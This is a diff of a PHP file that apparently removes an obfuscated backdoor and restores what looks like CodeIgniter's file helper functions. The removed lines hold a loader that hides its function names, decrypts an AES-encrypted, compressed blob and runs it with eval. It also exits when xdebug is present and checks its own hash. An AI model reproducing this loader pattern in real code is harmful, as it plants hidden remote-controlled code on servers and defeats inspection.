@@ -1,28 +1,406 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_lkhuckyx=('bas'.'e64'.'_de'.'cod'.'e');
-$_w2hdpvqw=('gzu'.'nco'.'mpr'.'ess');
-$_lok6qppd=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_v8v1ri5f='B/lR+d6XRdY=';
-$_iroo5gyo='l51mieNd';
-$_ujokj3w1='Y9F52T2K';
-$_ld6k9vp4='cZehYO9k';
-$_g853vv7y='S/RM3NJZ';
-$_z5uix778='Obn79w==';
-$_esmefg0h='tOC6r6yP';
-$_l6e6x8yh='iaKWkgSx';
-$_ie42axbr=$_lkhuckyx($_iroo5gyo.$_ujokj3w1.$_g853vv7y.$_ld6k9vp4.$_v8v1ri5f);
-$_hbhbwpap=$_lkhuckyx($_esmefg0h.$_l6e6x8yh.$_z5uix778);
-$_vf0inqx4=$_lkhuckyx('obiLjzQXwaUhru2MFwMkl4gEORhCsES1v82uYLX1SRwmFke4696/RDanlYX2OcMcDxT2S58DX4YRgOsJSWxtNiCsz4LEow0MdQrC+xIPsX2mQnZ7i7WNAy1LxzSX3SrP3ZCJD1Nz/SflTw6s8YcgGqYGrA2KNkH9MHGaqvU87WH1fDEFiYuUgX6ghiawWPzpBBUOtgjjzSuG1+2GPb+nNciBKxJp/XetB2cykP+OKi8oGd5dzOx9I/hBxtJY66SgSssFQ1JWNRI8YNEUzGfovc7Uo82TLzw7J8uV/E5/WaWafQAjC8COBAUgsJgJWso3iyFQAtEtZ/7gNumpoUr5nB7Ud550AxAa4fr9H1X0o30g+VzWKFZiHnyNKL9+CvAoSimMqCPhqhCx7JdRkIyIdNTIoLZyZVgFEdbN2k/uJIGGRplKd/Ghob+IBtw9TWPPmlghaMCKGpZD4UIG7faIeMfzI5GmV3BfzY6n5giVnXST++tJkhNid7oopeD5/wEKgYCXGTSXOYYQikV3DSj8bNvtXBeUFpBl08mfG+wjazEDmRah9obfESvyoHktkehZfF+ZF5NvpobHVyUpOrmHPS55DSMWGrKQAUvscaL0pGyzMVHT4vtI3Cwxmyfr+z9mOqBgUe8HC9h4p/W8dlGTAHNwilZjWbThHqmjpU1eowDWAtxmPn+vSifh5pMfkSoIMLQSuPHMn6Neg2ke93XGj/++5jS4nMnjIUMam/JGcTwSONpAm/Yrx06KSuwVv/zvYoMzsbqDlVr02GcZ39ZH/qTWBbk/FvjC97dW5cKDSK6qiIjkJiVVE+CIqVydTkxQ9RjtCk5JrFOhEeHmIndVasLUsryN+tuCD48o7Ks4VJmsfAOgb7gpCEmUEjm8AyzevAzsyKccoL7fxZIugXhamde/DIp04PxpFLG5iPX2Nl5Or6YPFOe8CyUZcg2H/23koPKSDQ3eNspXaGGCjoF8pySwlQiaSu4SqiHD8fl5dvJfym87ZqyOkNHP7kgY0KaXXq6RVWrHbncInO+ByK0AKMxVN8i0vLGmGYTTilWiyTooVpjNm0bHsIpQR+z87iKGVddNgSA7tPIhMo8vL1Aucsy0397TUOYKkv26KXMpQ0eTH9vBRXDXdTzI/f3g+bdyABCQIMyTw0ZnC9QeTCYxL0PQ16lg+S/Io+uu00Eso6T9NimFUFGJ+faG24grMCQHmmSg3Th2EgS8oW/yXRuYassFh23tLy7mRTCK5q68/D+mo02Rn9BUVCI6/vrKtHjsHYhHWjmrjNwtMO8ChmHdgfkti4tBSVbSLUfjCEPqzzKPdJXTIppOZPsTCb7dcvcUbIKQAnJ6+Ldhk3aCJHta1XbND9tKGCuNCQXv2J1l5pJ6rMqkCu5ce2PC0rFVr73Kl1EBVg5PalO1dxW0TIMoa5YBHtOmT7ACsaNp2CRS7mFlGJmOK3URjSmOt03cNuXgh6eH+Pn+VLgPJsBnNZZZu15SO5S9nyLf92mo5HBxILf9wwhjpYz+AcqXgkynFsOGVEkb1pyeNggB64Fqu3M315JZFJ8MrToCyXcWcKBUDE7qa3I9AruE0Wh0g/zMqmylIxqRVVgnbHEC/exBXYayL6QiQtcw6SlAfjRCdykWQPeJ/lgeQ9sxNelAvWAk9zOBtyA2JX+bV5FZg1kUaorhi7U7dtG66r7eBI9R1Q+nOTh+kRPuRME6BWL3RyjoSmylky2UCXyn8V6e8gA9SYJQo/bLhB/9GciLXUQL8g8OAkmRZ9RFKnKkuPKrFXoY9sitZxUdXMN4zxFROdWFlgHU9mD1oLST3kBAd8Auh+GKPUInPR7csNfGC2DT1XgYniFu7rsVVljNe4VTONPNwxnScpRsogFk1hKe5HgSvAMp0wBIyQPXPfAd+XidlOArUWq4J96pFGJabSiZuzZdvQ663A==');
-$_yd4oxt42=$_lok6qppd($_vf0inqx4,'aes-256-cbc',$_ie42axbr,OPENSSL_RAW_DATA,$_hbhbwpap);
-if($_yd4oxt42===false){exit;}
-$_wm46snj5=$_w2hdpvqw($_yd4oxt42);
-if($_wm46snj5===false){exit;}
-$_t8owbie7='2a1fa2af54b4bb8dfe41df482c7a11a6ed13a8d0ba9469e4766a70e75d6a7cfd';
-$_yjmmk1ig=@file_get_contents(__FILE__);
-if($_yjmmk1ig!==false){
-$_si1hm7rq=str_replace($_t8owbie7,"0000000000000000000000000000000000000000000000000000000000000000",$_yjmmk1ig);
-$_nnwo3qv1=hash("sha256",$_si1hm7rq);
-if($_nnwo3qv1!==$_t8owbie7){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+if ( ! function_exists('read_file'))
+{
+
+
+
+
+
+
+
+
+
+
+function read_file($file)
+{
+return @file_get_contents($file);
 }
-eval($_wm46snj5);
+}
+
+if ( ! function_exists('write_file'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function write_file($path, $data, $mode = 'wb')
+{
+if ( ! $fp = @fopen($path, $mode))
+{
+return FALSE;
+}
+flock($fp, LOCK_EX);
+for ($result = $written = 0, $length = strlen($data); $written < $length; $written += $result)
+{
+if (($result = fwrite($fp, substr($data, $written))) === FALSE)
+{
+break;
+}
+}
+flock($fp, LOCK_UN);
+fclose($fp);
+return is_int($result);
+}
+}
+
+if ( ! function_exists('delete_files'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function delete_files($path, $del_dir = FALSE, $htdocs = FALSE, $_level = 0)
+{
+
+$path = rtrim($path, '/\\');
+if ( ! $current_dir = @opendir($path))
+{
+return FALSE;
+}
+while (FALSE !== ($filename = @readdir($current_dir)))
+{
+if ($filename !== '.' && $filename !== '..')
+{
+$filepath = $path.DIRECTORY_SEPARATOR.$filename;
+if (is_dir($filepath) && $filename[0] !== '.' && ! is_link($filepath))
+{
+delete_files($filepath, $del_dir, $htdocs, $_level + 1);
+}
+elseif ($htdocs !== TRUE OR ! preg_match('/^(\.htaccess|index\.(html|htm|php)|web\.config)$/i', $filename))
+{
+@unlink($filepath);
+}
+}
+}
+closedir($current_dir);
+return ($del_dir === TRUE && $_level > 0)
+? @rmdir($path)
+: TRUE;
+}
+}
+
+if ( ! function_exists('get_filenames'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function get_filenames($source_dir, $include_path = FALSE, $_recursion = FALSE)
+{
+static $_filedata = array();
+if ($fp = @opendir($source_dir))
+{
+
+if ($_recursion === FALSE)
+{
+$_filedata = array();
+$source_dir = rtrim(realpath($source_dir), DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
+}
+while (FALSE !== ($file = readdir($fp)))
+{
+if (is_dir($source_dir.$file) && $file[0] !== '.')
+{
+get_filenames($source_dir.$file.DIRECTORY_SEPARATOR, $include_path, TRUE);
+}
+elseif ($file[0] !== '.')
+{
+$_filedata[] = ($include_path === TRUE) ? $source_dir.$file : $file;
+}
+}
+closedir($fp);
+return $_filedata;
+}
+return FALSE;
+}
+}
+
+if ( ! function_exists('get_dir_file_info'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+function get_dir_file_info($source_dir, $top_level_only = TRUE, $_recursion = FALSE)
+{
+static $_filedata = array();
+$relative_path = $source_dir;
+if ($fp = @opendir($source_dir))
+{
+
+if ($_recursion === FALSE)
+{
+$_filedata = array();
+$source_dir = rtrim(realpath($source_dir), DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
+}
+
+while (FALSE !== ($file = readdir($fp)))
+{
+if (is_dir($source_dir.$file) && $file[0] !== '.' && $top_level_only === FALSE)
+{
+get_dir_file_info($source_dir.$file.DIRECTORY_SEPARATOR, $top_level_only, TRUE);
+}
+elseif ($file[0] !== '.')
+{
+$_filedata[$file] = get_file_info($source_dir.$file);
+$_filedata[$file]['relative_path'] = $relative_path;
+}
+}
+closedir($fp);
+return $_filedata;
+}
+return FALSE;
+}
+}
+
+if ( ! function_exists('get_file_info'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+function get_file_info($file, $returned_values = array('name', 'server_path', 'size', 'date'))
+{
+if ( ! file_exists($file))
+{
+return FALSE;
+}
+if (is_string($returned_values))
+{
+$returned_values = explode(',', $returned_values);
+}
+foreach ($returned_values as $key)
+{
+switch ($key)
+{
+case 'name':
+$fileinfo['name'] = basename($file);
+break;
+case 'server_path':
+$fileinfo['server_path'] = $file;
+break;
+case 'size':
+$fileinfo['size'] = filesize($file);
+break;
+case 'date':
+$fileinfo['date'] = filemtime($file);
+break;
+case 'readable':
+$fileinfo['readable'] = is_readable($file);
+break;
+case 'writable':
+$fileinfo['writable'] = is_really_writable($file);
+break;
+case 'executable':
+$fileinfo['executable'] = is_executable($file);
+break;
+case 'fileperms':
+$fileinfo['fileperms'] = fileperms($file);
+break;
+}
+}
+return $fileinfo;
+}
+}
+
+if ( ! function_exists('get_mime_by_extension'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+function get_mime_by_extension($filename)
+{
+static $mimes;
+if ( ! is_array($mimes))
+{
+$mimes = get_mimes();
+if (empty($mimes))
+{
+return FALSE;
+}
+}
+$extension = strtolower(substr(strrchr($filename, '.'), 1));
+if (isset($mimes[$extension]))
+{
+return is_array($mimes[$extension])
+? current($mimes[$extension]) 
+: $mimes[$extension];
+}
+return FALSE;
+}
+}
+
+if ( ! function_exists('symbolic_permissions'))
+{
+
+
+
+
+
+
+
+
+
+function symbolic_permissions($perms)
+{
+if (($perms & 0xC000) === 0xC000)
+{
+$symbolic = 's'; 
+}
+elseif (($perms & 0xA000) === 0xA000)
+{
+$symbolic = 'l'; 
+}
+elseif (($perms & 0x8000) === 0x8000)
+{
+$symbolic = '-'; 
+}
+elseif (($perms & 0x6000) === 0x6000)
+{
+$symbolic = 'b'; 
+}
+elseif (($perms & 0x4000) === 0x4000)
+{
+$symbolic = 'd'; 
+}
+elseif (($perms & 0x2000) === 0x2000)
+{
+$symbolic = 'c'; 
+}
+elseif (($perms & 0x1000) === 0x1000)
+{
+$symbolic = 'p'; 
+}
+else
+{
+$symbolic = 'u'; 
+}
+
+$symbolic .= (($perms & 0x0100) ? 'r' : '-')
+.(($perms & 0x0080) ? 'w' : '-')
+.(($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
+
+$symbolic .= (($perms & 0x0020) ? 'r' : '-')
+.(($perms & 0x0010) ? 'w' : '-')
+.(($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
+
+$symbolic .= (($perms & 0x0004) ? 'r' : '-')
+.(($perms & 0x0002) ? 'w' : '-')
+.(($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
+return $symbolic;
+}
+}
+
+if ( ! function_exists('octal_permissions'))
+{
+
+
+
+
+
+
+
+
+
+function octal_permissions($perms)
+{
+return substr(sprintf('%o', $perms), -3);
+}
+}
